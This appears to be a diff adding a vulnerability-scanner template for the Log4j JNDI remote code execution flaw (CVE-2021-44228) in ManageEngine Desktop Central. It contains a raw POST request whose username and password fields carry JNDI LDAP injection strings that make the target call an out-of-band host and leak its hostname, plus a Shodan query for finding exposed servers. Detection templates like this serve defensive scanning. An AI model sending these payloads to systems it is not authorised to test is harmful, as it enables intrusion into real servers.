@@ -1,0 +1,67 @@
+id: manage-engine-dc-log4j-rce
+
+info:
+  name: Manage Engine Desktop Central - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    Manage Engine Endpoint Central (formerly Desktop Central) is susceptible to Log4j JNDI remote code execution. Endpoint Central is a Unified Endpoint Management (UEM) & Endpoint protection suite that helps manage and secure various network devices
+  reference:
+    - https://pitstop.manageengine.com/portal/en/community/topic/log4j-security-issue
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:zohocorp:manageengine_desktop_central:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    shodan-query: title:"ManageEngine Desktop Central"
+    product: manageengine_desktop_central
+    vendor: zohocorp
+  tags: cve,cve2021,rce,jndi,log4j,manage,engine,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /two_fact_auth HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/configurations
+        Content-Type: application/x-www-form-urlencoded
+
+        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&j_password=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&otpTimeout=7&browserLocale=en_us&cacheNum=4&csrfPreventionSaltForFlashMessage=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
+# digest: 490a0046304402206cd38f83031f2ad130b2bdcc4bdd6be877ae842d578c46eea395fd42c5800f880220144bb52172615fb2f1ef6c5906235e5326973edf954c9d319b44ea34b90deca8:922c64590222798bb761d5b6d8e72950
